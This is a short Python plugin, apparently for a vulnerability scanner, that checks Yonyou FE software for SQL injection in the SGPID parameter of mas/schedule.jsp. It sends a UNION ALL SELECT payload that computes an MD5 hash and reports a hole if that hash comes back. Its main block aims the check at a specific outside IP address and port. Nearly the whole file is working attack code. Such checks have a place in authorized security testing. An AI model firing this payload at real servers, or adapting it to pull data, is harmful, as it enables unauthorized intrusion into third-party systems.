#/usr/bin/python
#-*- coding: utf-8 -*-

def assign(service, arg):
    if service == "yongyou_fe":
        return True, arg 	

def audit(arg):
    url = arg + "mas/schedule.jsp?type=group&SGPID=1%27+UNION+ALL+SELECT+1,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%273.14%27)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"
    code, head, body, errcode, _url = curl.curl2(url)
    if code == 200 and '0x4beed3b9c4a886067de0e3a094246f78' in body: 
        security_hole(url)
			
    
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_fe', 'http://119.145.194.122:9090/')[1])